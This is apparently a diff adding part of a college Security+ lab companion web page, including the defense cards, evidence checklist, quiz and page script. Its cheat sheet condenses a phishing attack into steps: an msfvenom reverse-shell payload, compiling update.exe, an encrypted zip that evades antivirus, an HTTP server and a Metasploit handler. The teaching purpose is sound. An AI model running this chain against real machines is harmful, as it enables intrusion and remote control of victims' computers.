+          <p class="attack">Breaks: execution (Phase 4)</p>
+          <p class="ctrl">If only approved, signed software can run, <code class="inl">update.exe</code> never executes — regardless of how convincing the email was or whether the user clicked through SmartScreen.</p>
+        </div>
+        <div class="def-card">
+          <h4>EDR &amp; SmartScreen</h4>
+          <p class="attack">Breaks: execution / post-exploitation</p>
+          <p class="ctrl">The Defender warnings the lab overrides are real signals. Endpoint detection flags an unsigned binary spawning a network shell; left enabled and enforced, it blocks or alerts rather than asking the user to decide.</p>
+        </div>
+        <div class="def-card">
+          <h4>Protect the mail account</h4>
+          <p class="attack">Breaks: the launch point (Phase 2)</p>
+          <p class="ctrl">The attack starts from a <em>compromised</em> internal account. MFA, a real password policy, and impossible-travel alerting keep that account out of an attacker's hands in the first place — the lab's own intro hints at this.</p>
+        </div>
+      </div>
+
+      <div class="callout"><span class="tag">[DEFENSE IN DEPTH]</span>
+        Notice no single control is the answer — each one breaks a different link. That layering <em>is</em> the Security+ lesson: assume any one control can fail and make sure another is behind it.</div>
+
+      <label class="review"><input type="checkbox" data-review="defender"> Mark this section reviewed</label>
+    </section>
+
+    <!-- ================= EVIDENCE ================= -->
+    <section class="lab-section" id="evidence" data-section="evidence">
+      <h2 class="section-title"><span class="ico" aria-hidden="true">📸</span> Evidence to capture</h2>
+      <p class="section-lead">Your instructor wants screenshots of the key steps as proof you ran the lab. Grab these as you go, tick each one off, then print or submit this list as your evidence cover sheet. Ticks are saved in this browser.</p>
+      <div class="evidence">
+        <ul>
+          <li><input type="checkbox" data-evidence="e1"><span><span class="shot">Payload built.</span> The msfvenom output showing the shellcode and its byte count.</span></li>
+          <li><input type="checkbox" data-evidence="e2"><span><span class="shot">Firewall confirmed.</span> <code class="inl">ping -c4 192.168.0.50</code> with 100% packet loss.</span></li>
+          <li><input type="checkbox" data-evidence="e3"><span><span class="shot">Lure sent.</span> The composed email with the HERE link, before sending.</span></li>
+          <li><input type="checkbox" data-evidence="e4"><span><span class="shot">Listener up.</span> The handler reporting "Started reverse TCP handler."</span></li>
+          <li><input type="checkbox" data-evidence="e5"><span><span class="shot">Session opened.</span> msfconsole showing the new session when the victim ran the file.</span></li>
+          <li><input type="checkbox" data-evidence="e6"><span><span class="shot">Foothold proven.</span> <code class="inl">whoami</code> and <code class="inl">ipconfig</code> showing 192.168.0.50 inside the intranet.</span></li>
+        </ul>
+      </div>
+      <label class="review"><input type="checkbox" data-review="evidence"> Mark this section reviewed</label>
+    </section>
+
+    <!-- ================= CHEAT ================= -->
+    <section class="lab-section" id="cheat" data-section="cheat">
+      <h2 class="section-title"><span class="ico" aria-hidden="true">⚡</span> Cheat sheet</h2>
+      <p class="section-lead">The whole chain and its defenses on one screen.</p>
+      <div class="cheat">
+        <div class="col">
+          <h4>The attack chain</h4>
+          <ul>
+            <li><code>msfvenom -p windows/x64/shell_reverse_tcp LHOST= LPORT= -f c</code></li>
+            <li>Paste bytes + match length in <code>main.cpp</code></li>
+            <li><code>x86_64-w64-mingw32-g++ main.cpp -o update.exe</code></li>
+            <li><code>zip -e update.zip update.exe</code></li>
+            <li><code>python3 -m http.server</code></li>
+            <li>Email lure → link to the zip</li>
+            <li><code>use exploit/multi/handler</code> → <code>set payload windows/x64/shell_reverse_tcp</code> → <code>set LHOST</code> → <code>exploit</code></li>
+            <li>Victim runs it → session → <code>whoami</code>, <code>ipconfig</code></li>
+          </ul>
+        </div>
+        <div class="col">
+          <h4>What stops it</h4>
+          <ul>
+            <li>Egress filtering (kills the reverse shell)</li>
+            <li>Email gateway + block encrypted archives</li>
+            <li>Security awareness training</li>
+            <li>Application allow-listing</li>
+            <li>EDR / SmartScreen left enforced</li>
+            <li>MFA + password policy on mail</li>
+            <li>Defense in depth — layer them</li>
+          </ul>
+        </div>
+        <div class="col">
+          <h4>Know the terms</h4>
+          <ul>
+            <li><strong>Reverse shell</strong> — target dials out to attacker</li>
+            <li><strong>Payload</strong> — the code that runs on the target</li>
+            <li><strong>Handler</strong> — listener that catches the shell</li>
+            <li><strong>LHOST/LPORT</strong> — where/what the shell calls home</li>
+            <li><strong>Cross-compile</strong> — build Windows binary on Linux</li>
+            <li><strong>Egress</strong> — outbound traffic</li>
+          </ul>
+        </div>
+      </div>
+      <label class="review"><input type="checkbox" data-review="cheat"> Mark this section reviewed</label>
+    </section>
+
+    <!-- ================= CHECK ================= -->
+    <section class="lab-section" id="check" data-section="check">
+      <h2 class="section-title"><span class="ico" aria-hidden="true">✅</span> Check yourself</h2>
+      <p class="section-lead">Four questions in the style the exam asks them. Answer in your head, then reveal.</p>
+
+      <div class="q"><p class="ask">1. The firewall blocks all inbound traffic to the intranet, yet the attacker gets a shell on a machine there. How?</p>
+        <button class="reveal" type="button" data-action="reveal" aria-expanded="false">Show answer</button>
+        <div class="ans">The victim runs a program that opens an <em>outbound</em> connection to the attacker (a reverse shell). The firewall controls the direction of the first packet; it permits internal hosts to initiate connections out, so the shell rides that allowance. Inbound rules never come into play.</div></div>
+
+      <div class="q"><p class="ask">2. Why is the executable placed inside a password-protected zip before it's delivered?</p>
+        <button class="reveal" type="button" data-action="reveal" aria-expanded="false">Show answer</button>
+        <div class="ans">Encryption hides the contents from download/antivirus scanners, which can't inspect what they can't decrypt, so the EXE isn't flagged or deleted on arrival. The social-engineering email supplies the password so the victim does the extraction themselves.</div></div>
+
+      <div class="q"><p class="ask">3. Name the single most effective network control against this attack, and say why.</p>
+        <button class="reveal" type="button" data-action="reveal" aria-expanded="false">Show answer</button>
+        <div class="ans">Egress (outbound) filtering. The entire compromise depends on the victim host reaching out to the attacker on an arbitrary port; restricting outbound traffic to known-good destinations blocks and logs that call home, collapsing the chain even after the user runs the file.</div></div>
+
+      <div class="q"><p class="ask">4. The lab says the attack begins from a "compromised email account." Which controls would have protected that account, and which Security+ domain do they belong to?</p>
+        <button class="reveal" type="button" data-action="reveal" aria-expanded="false">Show answer</button>
+        <div class="ans">MFA, a strong password policy, and anomalous-login/impossible-travel alerting — identity and access management controls (Domain 4, Security Operations, and the identity material in Module 10). They stop the attacker from ever having a trusted inside account to send from.</div></div>
+
+      <label class="review"><input type="checkbox" data-review="check"> Mark this section reviewed</label>
+    </section>
+
+    <section class="lab-section" id="related" data-section="related">
+      <h2 class="section-title"><span class="ico" aria-hidden="true">🔗</span> Related labs</h2>
+      <p class="section-lead">Labs that build on the same ideas or tools.</p>
+      <div class="related">
+        <a class="rel-card" href="secplus_lab02_companion.html"><span class="rel-no">LAB 02</span><span class="rel-ttl">Malware & App Attacks</span><span class="rel-why">the same Metasploit reverse-shell chain</span></a>
+        <a class="rel-card" href="secplus_lab05_companion.html"><span class="rel-no">LAB 05</span><span class="rel-ttl">Attacks & Mitigation</span><span class="rel-why">more attack types and their mitigations</span></a>
+        <a class="rel-card" href="secplus_lab23_companion.html"><span class="rel-no">LAB 23</span><span class="rel-ttl">Incident Response</span><span class="rel-why">the responder's side of this exact attack</span></a>
+      </div>
+    </section>
+
+  </main>
+
+  <footer class="module-footer">
+    <p>Security+ Lab Companion &middot; Lab 01 &middot; Brookdale Community College &middot; 2026</p>
+  </footer>
+</div>
+
+<div class="toast" id="toast" role="status"></div>
+<div class="sr-only" id="liveRegion" aria-live="polite"></div>
+
+<!-- ==================== JS ==================== -->
+<script>
+(function () {
+  "use strict";
+  var root = document.documentElement;
+  var COURSE = root.getAttribute("data-course") || "course";
+  var LAB_ID = root.getAttribute("data-lab") || "0";
+  var PREFS_KEY = COURSE + ":prefs:v1";                 // shared with the textbook modules
+  var STATE_KEY = COURSE + ":labprogress:" + LAB_ID;    // this lab only
+  var SCALES = [0.9, 1, 1.15, 1.3];
+
+  function read(key, fallback) {
+    try { var raw = localStorage.getItem(key); return raw ? JSON.parse(raw) : fallback; }
+    catch (e) { return fallback; }
+  }
+  function write(key, value) {
+    try { localStorage.setItem(key, JSON.stringify(value)); } catch (e) {}
+  }
+
+  var live = document.getElementById("liveRegion");
+  function announce(msg) { if (live) { live.textContent = ""; setTimeout(function () { live.textContent = msg; }, 30); } }
+  var toastEl = document.getElementById("toast"), toastT;
+  function notify(msg) {
+    toastEl.textContent = msg; toastEl.className = "toast on";
+    clearTimeout(toastT); toastT = setTimeout(function () { toastEl.className = "toast"; }, 2400);
+    announce(msg);
+  }
+
+  /* ---------- prefs: theme + text scale (synced with the modules) ---------- */
+  var prefs = read(PREFS_KEY, { theme: null, scaleIndex: 1 });
+  function applyTheme(theme) {
+    root.setAttribute("data-theme", theme);
+    var btn = document.getElementById("themeToggle"), dark = theme === "dark";
+    btn.setAttribute("aria-pressed", String(dark));
+    btn.querySelector(".ctl__icon").textContent = dark ? "\uD83C\uDF19" : "\u2600\uFE0F";
+    btn.querySelector(".ctl__text").textContent = dark ? "Dark" : "Light";
+    btn.setAttribute("aria-label", "Switch to " + (dark ? "light" : "dark") + " theme");
+  }
+  function setTheme(t) { prefs.theme = t; write(PREFS_KEY, prefs); applyTheme(t); }
+  function applyScale(idx) {
+    idx = Math.max(0, Math.min(SCALES.length - 1, idx));
+    prefs.scaleIndex = idx;
+    root.style.setProperty("--font-scale", SCALES[idx]);
+    var pct = Math.round(SCALES[idx] * 100) + "%";
+    document.getElementById("fontSizeValue").textContent = pct;
+    document.getElementById("fontDec").disabled = idx === 0;
+    document.getElementById("fontInc").disabled = idx === SCALES.length - 1;
+    return pct;
+  }
+  function setScale(idx) { var pct = applyScale(idx); write(PREFS_KEY, prefs); announce("Text size " + pct); }
+  var systemDark = !window.matchMedia || !window.matchMedia("(prefers-color-scheme: light)").matches;
+  applyTheme(prefs.theme || (systemDark ? "dark" : "light"));
+  applyScale(typeof prefs.scaleIndex === "number" ? prefs.scaleIndex : 1);
+
+  /* ---------- progress + evidence state ---------- */
+  var SECTIONS = Array.prototype.slice.call(document.querySelectorAll("[data-review]")).map(function (el) { return el.getAttribute("data-review"); });
+  var state = read(STATE_KEY, { reviewed: [], evidence: [] });
+  var reviewed = new Set(state.reviewed || []);
+  var evidence = new Set(state.evidence || []);
+
+  function save() { write(STATE_KEY, { reviewed: Array.from(reviewed), evidence: Array.from(evidence) }); }
+
+  function paint() {
+    // review checkboxes + nav ticks
+    document.querySelectorAll("[data-review]").forEach(function (cb) {
+      var id = cb.getAttribute("data-review"), on = reviewed.has(id);
+      cb.checked = on;
+      var nav = document.querySelector('[data-nav="' + id + '"]');
+      if (nav) nav.classList.toggle("is-done", on);
+    });
+    document.querySelectorAll("[data-evidence]").forEach(function (cb) {
+      cb.checked = evidence.has(cb.getAttribute("data-evidence"));
+    });
+    var pct = SECTIONS.length ? Math.round(reviewed.size / SECTIONS.length * 100) : 0;
+    var bar = document.getElementById("progressBar");
+    bar.style.width = pct + "%"; bar.setAttribute("aria-valuenow", String(pct));
+    document.getElementById("progressText").textContent =
+      pct + "% · " + reviewed.size + " of " + SECTIONS.length + " sections reviewed";
+  }
+
+  function resetProgress() {
+    reviewed.clear(); evidence.clear(); save(); paint();
+    document.querySelectorAll(".ans.on").forEach(function (a) {
+      a.classList.remove("on"); var b = a.previousElementSibling;
+      if (b) { b.textContent = "Show answer"; b.setAttribute("aria-expanded", "false"); }
+    });
+    notify("Progress cleared");
+  }
+
+  /* ---------- delegated events ---------- */
+  var actions = {
+    toggleTheme: function () { setTheme(root.getAttribute("data-theme") === "dark" ? "light" : "dark"); },
+    fontDec: function () { setScale(prefs.scaleIndex - 1); },
+    fontInc: function () { setScale(prefs.scaleIndex + 1); },
+    print: function () { if (typeof window.print === "function") window.print(); },
+    resetProgress: resetProgress,
+    reveal: function (btn) {
+      var ans = btn.nextElementSibling, open = ans.classList.toggle("on");
+      btn.setAttribute("aria-expanded", String(open));
+      btn.textContent = open ? "Hide answer" : "Show answer";
+    }
+  };
+  document.addEventListener("click", function (e) {
+    var t = e.target.closest("[data-action]");
+    if (!t) return;
+    var fn = actions[t.getAttribute("data-action")];
+    if (fn) fn(t);
+  });
+  document.addEventListener("change", function (e) {
+    var r = e.target.closest("[data-review]");
+    if (r) {
+      var id = r.getAttribute("data-review");
+      if (r.checked) reviewed.add(id); else reviewed.delete(id);
+      save(); paint();
+      if (r.checked && reviewed.size === SECTIONS.length) notify("All sections reviewed — nice work.");
+      return;
+    }
+    var ev = e.target.closest("[data-evidence]");
+    if (ev) {
+      var k = ev.getAttribute("data-evidence");
+      if (ev.checked) evidence.add(k); else evidence.delete(k);
+      save();
+    }
+  });
+
+  paint();
+})();
+</script>
+</body>
+</html>
